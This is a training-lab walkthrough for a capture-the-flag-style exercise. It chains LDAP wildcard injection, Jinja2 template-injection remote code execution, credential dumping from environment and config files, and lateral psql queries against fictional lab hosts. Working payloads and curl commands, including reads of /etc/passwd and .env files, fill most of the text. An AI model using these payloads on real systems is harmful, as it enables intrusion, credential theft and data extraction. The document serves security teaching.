Once an attacker achieves code execution on a server, the next step is usually credential discovery. Applications store database credentials, API keys, and service account passwords in environment variables, configuration files, and container orchestration secrets.

Common credential locations:

Location Access Method Typical Contents Environment variables os.environ or /proc/self/environ Database URLs, API keys, secret tokens Configuration files /app/config.py, /etc/app/settings.ini DB credentials, LDAP bind passwords Docker secrets /run/secrets/* Mounted secret files .env files /app/.env Application configuration Container labels Docker API Service discovery metadata

In Jinja2 SSTI, environment variables are accessible through multiple paths:

# Flask config (if the app is Flask-based)
{{config.items()}}

# Direct os.environ access
{{cycler.__init__.__globals__.os.environ}}

# Process environment via /proc
{{cycler.__init__.__globals__.os.popen('cat /proc/self/environ').read()}}

# Request environment (WSGI variables)
{{request.environ}}

docs.title: PostgreSQL One-Liners
docs.text:
Once database credentials are discovered, the attacker connects to the database to extract sensitive data. PostgreSQL provides the psql command-line client for direct database access.

Common psql commands:

# Connect and run a query
PGPASSWORD=pass psql -h hostname -U username -d database -c "SELECT * FROM table"

# Connect and get just the data (no headers/footers)
PGPASSWORD=pass psql -h hostname -U username -d database -t -c "SELECT column FROM table"

# List all tables
PGPASSWORD=pass psql -h hostname -U username -d database -c "\dt"

# Describe a table's columns
PGPASSWORD=pass psql -h hostname -U username -d database -c "\d table_name"

The -t flag (tuples only) suppresses column headers and row count footers, returning only the data. Combined with -c (command), it provides clean output suitable for scripting.

The PGPASSWORD environment variable passes the password without an interactive prompt. In production, .pgpass files or connection strings are preferred, but PGPASSWORD is practical for one-off queries during a penetration test.

docs.title: Tool Primer: LDAP Query Syntax
docs.text:
Understanding LDAP filter syntax is essential for crafting injection payloads. LDAP filters use prefix notation with boolean operators.

Filter operators:

Operator Syntax Meaning Equality (uid=s.chen) uid equals s.chen Wildcard (uid=s*) uid starts with s AND (&(uid=s.chen)(role=admin)) Both conditions must match OR (\|(uid=s.chen)(uid=admin)) Either condition matches NOT (!(uid=guest)) uid is not guest

Special characters that affect filter parsing:

Character Meaning Escaped Form * Wildcard (matches any value) \2a ( Opens filter group \28 ) Closes filter group \29 \ Escape character \5c NUL Null byte \00

When an application fails to escape these characters in user input, the attacker can modify the filter logic.

docs.title: Tool Primer: Jinja2 SSTI Payloads
docs.text:
A progression of payloads from detection to exploitation:

Detection (confirm SSTI exists):

{{7*7}}                          -> 49
{{7*'7'}}                        -> 7777777
{{'hello'|upper}}                -> HELLO

Information gathering (read application data):

{{config}}                       -> Flask config object
{{config.items()}}               -> All config key-value pairs
{{request.environ}}              -> WSGI environment variables
{{self.__class__.__name__}}      -> Template class name

Remote code execution (execute system commands):

# Via cycler (Jinja2 global)
{{cycler.__init__.__globals__.os.popen('id').read()}}

# Via joiner (another Jinja2 global)
{{joiner.__init__.__globals__.os.popen('whoami').read()}}

# Via namespace
{{namespace.__init__.__globals__.os.popen('ls /').read()}}

# Via lipsum (Jinja2 utility)
{{lipsum.__globals__.os.popen('cat /etc/passwd').read()}}

Reading environment variables:

# All environment variables as a dictionary
{{cycler.__init__.__globals__.os.environ}}

# Specific environment variable
{{cycler.__init__.__globals__.os.environ.get('DATABASE_URL')}}

Complex command execution (chained commands):

# Pipe commands
{{cycler.__init__.__globals__.os.popen('cat /etc/passwd | grep root').read()}}

# Multiple commands with semicolons
{{cycler.__init__.__globals__.os.popen('id; whoami; hostname').read()}}

# Database query via psql
{{cycler.__init__.__globals__.os.popen('PGPASSWORD=pass psql -h host -U user -d db -t -c "SELECT 1"').read()}}

docs.title: Walkthrough
docs.text:
The walkthrough is organized into four phases matching the attack chain. Each phase builds on the output of the previous one. Do not skip ahead. Document your findings at each step because you will need them later.

graph TD
    A["Phase 1<br/>LDAP Injection"] -->|"Authenticated session"| B["Phase 2<br/>SSTI Discovery"]
    B -->|"Code execution"| C["Phase 3<br/>Credential Discovery"]
    C -->|"DB credentials"| D["Phase 4<br/>Lateral Movement"]
    D -->|"Flag extracted"| E["Engagement<br/>Complete"]

    style A fill:#00d4ff,color:#000
    style B fill:#6aaa64,color:#fff
    style C fill:#e94560,color:#fff
    style D fill:#ffd700,color:#000
    style E fill:#ff6b6b,color:#fff

docs.title: Phase 1: LDAP Injection - Bypassing Authentication
docs.text: The admin portal authenticates against an LDAP directory server. The login form accepts a username and password, constructs an LDAP search filter, and checks whether the filter returns a valid entry. The application does not sanitize the password field before inserting it into the LDAP filter, making it vulnerable to wildcard injection.

docs.title: Step 1: Launch the Exercise
docs.text: Navigate to the platform and launch the Admin Takeover exercise (MEG4.1). Note the target IP addresses displayed in the Active Lab View. Four containers start: the admin portal, the LDAP server, the engineering database, and the corporate database.

docs.title: Step 2: Configure Host Resolution
docs.text:
Add the target hostnames to your /etc/hosts file:

Kali - Add target hostnames to /etc/hosts

echo "<subnet>.10  admin.meridian-energy.corp" | sudo tee -a /etc/hosts
echo "<subnet>.11  eng-db.meridian-energy.corp" | sudo tee -a /etc/hosts
echo "<subnet>.12  ldap.meridian-energy.corp" | sudo tee -a /etc/hosts
echo "<subnet>.13  db.meridian-energy.corp" | sudo tee -a /etc/hosts

Verify connectivity to the admin portal:

Kali - Verify connectivity to the admin portal

curl -s -o /dev/null -w "%{http_code}" http://admin.meridian-energy.corp/

A 200 response confirms the portal is reachable. Any other status code indicates a connectivity issue. Verify your VPN connection and /etc/hosts entries before proceeding.

docs.title: Step 3: Explore the Admin Portal Login Page
docs.text:
Examine the login page to understand the authentication mechanism:

Kali - Fetch the admin portal login page

curl -s http://admin.meridian-energy.corp/ | head -100

Look for the login form fields, the form action URL, and any hidden fields or JavaScript that indicate the authentication method. The form should submit to a login endpoint via POST with username and password fields.

Examine the page for visual clues about the authentication backend. Error messages, footer text, or form labels may reference "LDAP," "Directory," or "Active Directory." These hints confirm that the authentication is LDAP-based rather than database-based.

docs.title: Step 4: Attempt Authentication with a Known Username
docs.text:
Try logging in with Sarah Chen's username and an incorrect password to observe the error behavior:

Kali - Test login with incorrect password

curl -s -X POST http://admin.meridian-energy.corp/login \
  -d "username=s.chen&password=WrongPassword123" -v 2>&1 | tail -30

The -v flag shows the full HTTP request and response headers. Examine the response carefully for:

  • Error messages: "Invalid credentials," "Authentication failed," or "LDAP bind error" confirm the authentication backend
  • Response codes: A 401 or 403 indicates failed authentication; a 302 redirect indicates successful authentication
  • Set-Cookie headers: A session cookie in the response headers means the server uses cookie-based sessions
  • Response body: HTML content may reveal error details, stack traces, or LDAP-specific messages

Record the exact error message. LDAP-specific error messages (such as "LDAP authentication failed" or "Invalid DN syntax") confirm that the portal authenticates against an LDAP server and inform your injection strategy.

docs.title: Step 5: Attempt Authentication with a Nonexistent Username
docs.text:
Try a username that does not exist in the LDAP directory:

Kali - Test login with nonexistent username

curl -s -X POST http://admin.meridian-energy.corp/login \
  -d "username=nonexistent.user&password=Test123" -v 2>&1 | tail -30

Compare the error message to the one from Step 4. If the messages differ (e.g., "User not found" vs. "Invalid password"), the application reveals whether the username exists. Username enumeration through differing error messages is a separate vulnerability, but it confirms that s.chen is a valid account.

docs.title: Step 6: Exploit LDAP Wildcard Injection
docs.text:
The LDAP search filter constructed by the application looks like:

(&(uid=s.chen)(userPassword=USER_INPUT))

If the application does not escape the * character, submitting * as the password produces:

(&(uid=s.chen)(userPassword=*))

The * wildcard matches any value in the userPassword field. Since every LDAP entry has a password value, the filter matches Sarah Chen's entry regardless of the actual password.

Submit the injection:

Kali - Exploit LDAP injection with wildcard password

curl -s -c admin_cookies.txt -X POST http://admin.meridian-energy.corp/login \
  -d "username=s.chen&password=*" -v 2>&1 | tail -40

Examine the response. A successful bypass shows:

  • A 302 redirect to the dashboard or admin page
  • A Set-Cookie header containing a session token
  • No error message in the response body

If you see a redirect, the LDAP injection worked. The session cookie is saved in admin_cookies.txt for use in subsequent requests.

docs.title: Step 7: Verify Authenticated Access
docs.text:
Follow the redirect and access the admin dashboard:

Kali - Access the admin dashboard with session cookie

curl -s -b admin_cookies.txt http://admin.meridian-energy.corp/dashboard

The dashboard should display administrative functionality:

  • User Management: List, create, and modify user accounts
  • System Configuration: Network settings, service status, backup schedules
  • Report Generator: Create compliance, audit, and engineering reports
  • Logs: Authentication logs, system events, error logs

Record all available sections and their URLs. The Report Generator is the target for Phase 2.

docs.title: Step 8: Enumerate the Admin Dashboard
docs.text:
Explore each section of the dashboard to understand the full attack surface:

Kali - Check user management section

curl -s -b admin_cookies.txt http://admin.meridian-energy.corp/users

Kali - Check system configuration section

curl -s -b admin_cookies.txt http://admin.meridian-energy.corp/config

Kali - Check the report generator

curl -s -b admin_cookies.txt http://admin.meridian-energy.corp/reports

Kali - Check application logs

curl -s -b admin_cookies.txt http://admin.meridian-energy.corp/logs

Document what each section reveals. The user management section may list all LDAP accounts and their organizational units. The configuration section may expose internal hostnames and service endpoints. The logs section may show recent authentication attempts, including your failed login from Step 4.

The Report Generator is the priority target. Examine its form fields, submit behavior, and any template or format options it provides.

docs.title: Phase 2: Server-Side Template Injection (SSTI)
docs.text: The Report Generator allows administrators to create reports by entering parameters into a form. The application takes the form input and renders it using Jinja2 templates. If user input is embedded directly into the template string before rendering, the application is vulnerable to SSTI.

docs.title: Step 9: Understand the Report Generator Interface
docs.text:
Examine the Report Generator form:

Kali - Fetch the report generator form

curl -s -b admin_cookies.txt http://admin.meridian-energy.corp/reports

Look at the form fields. The generator likely accepts parameters like:

  • Report title: A free-text field for naming the report
  • Report type: A dropdown for selecting the report category
  • Date range: Start and end dates for the report period
  • Additional notes or description: A free-text field for custom content

The free-text fields (title, notes, description) are the most likely injection points. The application probably concatenates these values into a Jinja2 template string before rendering.

docs.title: Step 10: Submit a Normal Report
docs.text:
Generate a legitimate report to see the output format:

Kali - Generate a normal report

curl -s -b admin_cookies.txt -X POST http://admin.meridian-energy.corp/reports/generate \
  -d "title=Quarterly+Compliance+Report&type=compliance&notes=Standard+quarterly+review"

Examine the response. The rendered report should include the title and notes you submitted, formatted within a report template. Note where your input appears in the output. If the title "Quarterly Compliance Report" appears verbatim in the rendered HTML, that field is a candidate for SSTI testing.

docs.title: Step 11: Test for SSTI with a Mathematical Expression
docs.text:
Inject a Jinja2 expression into the title or notes field:

Kali - Test SSTI with mathematical expression in the title field

curl -s -b admin_cookies.txt -X POST http://admin.meridian-energy.corp/reports/generate \
  -d "title={{7*7}}&type=compliance&notes=test"

Examine the response. If the output shows 49 where you submitted {{7*7}}, SSTI is confirmed. The application compiled your input as Jinja2 template code and evaluated the expression.

If the title field is not vulnerable, try the notes field:

Kali - Test SSTI in the notes field

curl -s -b admin_cookies.txt -X POST http://admin.meridian-energy.corp/reports/generate \
  -d "title=Test+Report&type=compliance&notes={{7*7}}"

Again, look for 49 in the output. Whichever field renders the expression is the injection point for all subsequent payloads.

docs.title: Step 12: Confirm SSTI with String Operations
docs.text:
Verify SSTI with a more definitive payload that could not result from coincidence:

Kali - Confirm SSTI with string multiplication

curl -s -b admin_cookies.txt -X POST http://admin.meridian-energy.corp/reports/generate \
  -d "title={{7*'7'}}&type=compliance&notes=test"

In Python (and Jinja2), 7*'7' produces the string 7777777 (the character 7 repeated seven times). If the output shows 7777777, the template engine is evaluating Python expressions, confirming full SSTI.

docs.title: Step 13: Enumerate Available Objects
docs.text:
Before jumping to RCE, explore what objects and data are accessible through the template context:

Kali - List template configuration items

curl -s -b admin_cookies.txt -X POST http://admin.meridian-energy.corp/reports/generate \
  -d "title={{config.items()}}&type=compliance&notes=test"

The config object contains the Flask application configuration. Look for:

  • SECRET_KEY: The application's secret key used for signing sessions
  • SQLALCHEMY_DATABASE_URI: Database connection string (if using SQLAlchemy)
  • LDAP_HOST: The LDAP server hostname
  • Any custom configuration keys that reference database credentials or service endpoints

Record every configuration item. Database connection strings and service hostnames are valuable for Phase 3.

Kali - Read request environment variables

curl -s -b admin_cookies.txt -X POST http://admin.meridian-energy.corp/reports/generate \
  -d "title={{request.environ}}&type=compliance&notes=test"

The request.environ dictionary contains WSGI environment variables, HTTP headers, and server information. Examine the output for internal hostnames, port numbers, and any credentials passed through environment variables.

docs.title: Step 14: Test Command Execution
docs.text:
Attempt to execute a system command through the Jinja2 sandbox escape:

Kali - Test command execution via SSTI

curl -s -b admin_cookies.txt -X POST http://admin.meridian-energy.corp/reports/generate \
  -d "title={{cycler.__init__.__globals__.os.popen('id').read()}}&type=compliance&notes=test"

If the output shows uid= followed by user and group IDs (e.g., uid=0(root) gid=0(root)), you have achieved remote code execution through SSTI. The cycler object is a Jinja2 global, and its __init__.__globals__ dictionary provides access to the os module.

Note the UID in the output. If the application runs as root (uid=0), every subsequent command executes with root privileges. If it runs as a non-root user (e.g., uid=1000(app)), commands execute with that user's permissions.

docs.title: Step 15: Explore the Server Filesystem
docs.text:
Use RCE to explore the admin portal server:

Kali - List the application directory

curl -s -b admin_cookies.txt -X POST http://admin.meridian-energy.corp/reports/generate \
  -d "title={{cycler.__init__.__globals__.os.popen('ls -la /app/').read()}}&type=compliance&notes=test"

Look for configuration files, .env files, database connection modules, and deployment scripts. Common locations include:

  • /app/config.py or /app/settings.py: Application configuration
  • /app/.env: Environment-specific settings
  • /app/requirements.txt: Python dependencies (reveals framework and library versions)
  • /app/app.py or /app/main.py: Application entry point

Kali - Read the application source code

curl -s -b admin_cookies.txt -X POST http://admin.meridian-energy.corp/reports/generate \
  -d "title={{cycler.__init__.__globals__.os.popen('cat /app/app.py').read()}}&type=compliance&notes=test"

The application source code reveals the exact LDAP filter construction (confirming the injection vector), the Jinja2 rendering logic (confirming the SSTI vector), and potentially hardcoded credentials or environment variable names for the engineering database.

Kali - Check for .env files

curl -s -b admin_cookies.txt -X POST http://admin.meridian-energy.corp/reports/generate \
  -d "title={{cycler.__init__.__globals__.os.popen('cat /app/.env 2>/dev/null; echo ---; env').read()}}&type=compliance&notes=test"

The command tries to read /app/.env first, then falls back to printing all environment variables with env. Either source may contain database credentials.

docs.title: Phase 3: Credential Discovery
docs.text: With code execution on the admin portal server, you can read environment variables, configuration files, and any data accessible to the application process. The engineering database credentials are stored somewhere on the server. Your task is to find them.

docs.title: Step 16: Read All Environment Variables
docs.text:
Use SSTI to dump the complete process environment:

Kali - Dump all environment variables via SSTI

curl -s -b admin_cookies.txt -X POST http://admin.meridian-energy.corp/reports/generate \
  -d "title={{cycler.__init__.__globals__.os.popen('env').read()}}&type=compliance&notes=test"

The output should contain multiple environment variables. Scan for:

  • ENG_DB_HOST: The hostname or IP of the engineering database
  • ENG_DB_USER: The database username
  • ENG_DB_PASS: The database password
  • ENG_DB_NAME: The database name
  • DATABASE_URL: A connection string that may contain all of the above
  • Any variable with DB, POSTGRES, SQL, PASS, SECRET, or CRED in its name

Record every credential-related variable. The engineering database password should be something like Eng_DB_Pr0d_2024#.

docs.title: Step 17: Access Environment Variables Through Python Objects
docs.text:
An alternative approach uses Jinja2's access to the os.environ dictionary:

Kali - Read environment variables via os.environ

curl -s -b admin_cookies.txt -X POST http://admin.meridian-energy.corp/reports/generate \
  -d "title={{cycler.__init__.__globals__.os.environ}}&type=compliance&notes=test"

The output is a Python dictionary-style string containing all environment variables. While less readable than the env command output, it confirms the same data and may reveal additional variables set through Python code rather than the OS environment.

docs.title: Step 18: Read Configuration Files
docs.text:
Check for database configuration in application files:

Kali - Read database configuration file

curl -s -b admin_cookies.txt -X POST http://admin.meridian-energy.corp/reports/generate \
  -d "title={{cycler.__init__.__globals__.os.popen('find /app -name \"*.py\" -exec grep -l -i \"database\\|postgres\\|eng_db\" {} +').read()}}&type=compliance&notes=test"

The find command searches for Python files containing database-related strings. Read any files it discovers:

Kali - Read identified configuration files

curl -s -b admin_cookies.txt -X POST http://admin.meridian-energy.corp/reports/generate \
  -d "title={{cycler.__init__.__globals__.os.popen('cat /app/config.py').read()}}&type=compliance&notes=test"

Configuration files may contain hardcoded fallback credentials used when environment variables are not set. They also reveal the expected database schema, table names, and query patterns, all of which inform Phase 4.

docs.title: Step 19: Verify Database Connectivity
docs.text:
Before attempting to query the engineering database, verify that the admin portal server can reach it:

Kali - Test network connectivity to engineering database

curl -s -b admin_cookies.txt -X POST http://admin.meridian-energy.corp/reports/generate \
  -d "title={{cycler.__init__.__globals__.os.popen('ping -c 1 eng-db.meridian-energy.corp 2>&1 || echo Host unreachable').read()}}&type=compliance&notes=test"

If the internal hostname does not resolve, try the Docker service name or direct IP:

Kali - Try alternative hostname for engineering database

curl -s -b admin_cookies.txt -X POST http://admin.meridian-energy.corp/reports/generate \
  -d "title={{cycler.__init__.__globals__.os.popen('getent hosts eng-db.meridian-energy.corp engineering-db eng-db 2>&1').read()}}&type=compliance&notes=test"

Record the hostname that resolves successfully. You will use it in the PostgreSQL connection command in Phase 4.

docs.title: Step 20: Check for psql Client
docs.text:
Verify that the PostgreSQL client is available on the admin portal server:

Kali - Check for psql client

curl -s -b admin_cookies.txt -X POST http://admin.meridian-energy.corp/reports/generate \
  -d "title={{cycler.__init__.__globals__.os.popen('which psql 2>&1; psql --version 2>&1').read()}}&type=compliance&notes=test"

If psql is not installed, check for alternative database clients:

Kali - Check for alternative database tools

curl -s -b admin_cookies.txt -X POST http://admin.meridian-energy.corp/reports/generate \
  -d "title={{cycler.__init__.__globals__.os.popen('which psql mysql sqlite3 python3 2>&1').read()}}&type=compliance&notes=test"

If psql is not available but python3 is, you can use Python's psycopg2 library (if installed) to connect to PostgreSQL. The walkthrough assumes psql is available. If not, adapt the commands to use Python.

docs.title: Phase 4: Lateral Movement to the Engineering Database
docs.text: You have the engineering database hostname, username, password, and database name from Phase 3. You have confirmed network connectivity and psql availability from the admin portal server. Now connect to the engineering database and extract the master flag.

docs.title: Step 21: Connect to the Engineering Database
docs.text:
Use the credentials discovered in Phase 3 to query the engineering database. Replace the hostname, username, password, and database name with the values you extracted:

Kali - List tables in the engineering database

curl -s -b admin_cookies.txt -X POST http://admin.meridian-energy.corp/reports/generate \
  -d "title={{cycler.__init__.__globals__.os.popen('PGPASSWORD=Eng_DB_Pr0d_2024# psql -h engineering-db -U eng_admin -d engineering -c \"\\dt\"').read()}}&type=compliance&notes=test"

The \dt command lists all tables in the database. Examine the output for tables related to:

  • SCADA configurations: scada_controllers, plc_configs, sensor_arrays
  • Maintenance: maintenance_schedules, firmware_updates
  • Secrets: admin_secrets, credentials, flags
  • Users: engineers, operators, admin_users

Record every table name. The master flag is stored in one of these tables.

docs.title: Step 22: Enumerate Table Schemas
docs.text:
Describe the structure of the most interesting tables:

Kali - Describe the admin_secrets table

curl -s -b admin_cookies.txt -X POST http://admin.meridian-energy.corp/reports/generate \
  -d "title={{cycler.__init__.__globals__.os.popen('PGPASSWORD=Eng_DB_Pr0d_2024# psql -h engineering-db -U eng_admin -d engineering -c \"\\d admin_secrets\"').read()}}&type=compliance&notes=test"

The \d table_name command describes a table's columns, data types, and constraints. Look for columns named secret_key, secret_value, flag, token, or similar.

Kali - Describe the scada_controllers table

curl -s -b admin_cookies.txt -X POST http://admin.meridian-energy.corp/reports/generate \
  -d "title={{cycler.__init__.__globals__.os.popen('PGPASSWORD=Eng_DB_Pr0d_2024# psql -h engineering-db -U eng_admin -d engineering -c \"\\d scada_controllers\"').read()}}&type=compliance&notes=test"

Document the schema of each table. The column names and data types reveal the purpose of each table and help you construct targeted queries.

docs.title: Step 23: Query for the Master Flag
docs.text:
Based on the table schemas, construct a query to extract the flag. If the table is admin_secrets with columns secret_key and secret_value:

Kali - Extract the master flag from admin_secrets

curl -s -b admin_cookies.txt -X POST http://admin.meridian-energy.corp/reports/generate \
  -d "title={{cycler.__init__.__globals__.os.popen('PGPASSWORD=Eng_DB_Pr0d_2024# psql -h engineering-db -U eng_admin -d engineering -t -c \"SELECT secret_value FROM admin_secrets WHERE secret_key=\\x27master_flag\\x27\"').read()}}&type=compliance&notes=test"

Note the escaping: \\x27 represents a single quote inside the nested command string. The -t flag (tuples only) returns just the data value without column headers or row counts.

If the flag is not in admin_secrets, try other tables:

Kali - Query all rows from admin_secrets

curl -s -b admin_cookies.txt -X POST http://admin.meridian-energy.corp/reports/generate \
  -d "title={{cycler.__init__.__globals__.os.popen('PGPASSWORD=Eng_DB_Pr0d_2024# psql -h engineering-db -U eng_admin -d engineering -c \"SELECT * FROM admin_secrets\"').read()}}&type=compliance&notes=test"

The full table dump shows all rows and helps you identify the correct secret_key value to filter on.

docs.title: Step 24: Extract Additional Intelligence
docs.text:
While you have database access, extract other high-value data to document the full impact:

Kali - Extract SCADA controller configurations

curl -s -b admin_cookies.txt -X POST http://admin.meridian-energy.corp/reports/generate \
  -d "title={{cycler.__init__.__globals__.os.popen('PGPASSWORD=Eng_DB_Pr0d_2024# psql -h engineering-db -U eng_admin -d engineering -c \"SELECT * FROM scada_controllers LIMIT 5\"').read()}}&type=compliance&notes=test"

SCADA controller data includes IP addresses, firmware versions, protocol types (Modbus, DNP3, IEC 61850), and access credentials. In a real engagement, access to the data would represent a critical finding because it could enable direct manipulation of industrial control systems.

Kali - Check for additional credential tables

curl -s -b admin_cookies.txt -X POST http://admin.meridian-energy.corp/reports/generate \
  -d "title={{cycler.__init__.__globals__.os.popen('PGPASSWORD=Eng_DB_Pr0d_2024# psql -h engineering-db -U eng_admin -d engineering -c \"SELECT table_name FROM information_schema.tables WHERE table_schema=\\x27public\\x27\"').read()}}&type=compliance&notes=test"

The information_schema.tables query lists every table in the database, including tables you may not have discovered through \dt. Record the complete table inventory.

docs.title: Step 25: Verify Network Position
docs.text:
Confirm the lateral movement path by checking the admin portal server's network configuration:

Kali - Check network interfaces on the admin portal server

curl -s -b admin_cookies.txt -X POST http://admin.meridian-energy.corp/reports/generate \
  -d "title={{cycler.__init__.__globals__.os.popen('ip addr show 2>/dev/null || ifconfig 2>/dev/null').read()}}&type=compliance&notes=test"

Kali - Check routing table

curl -s -b admin_cookies.txt -X POST http://admin.meridian-energy.corp/reports/generate \
  -d "title={{cycler.__init__.__globals__.os.popen('ip route show 2>/dev/null || route -n 2>/dev/null').read()}}&type=compliance&notes=test"

The network configuration reveals which subnets the admin portal server can reach. Multiple interfaces or routes indicate that the server bridges different network segments, explaining how it can reach both the LDAP server and the engineering database.

docs.title: Step 26: Document and Submit
docs.text: Record the master flag and submit it on the platform. The flag format is OCR{...}.
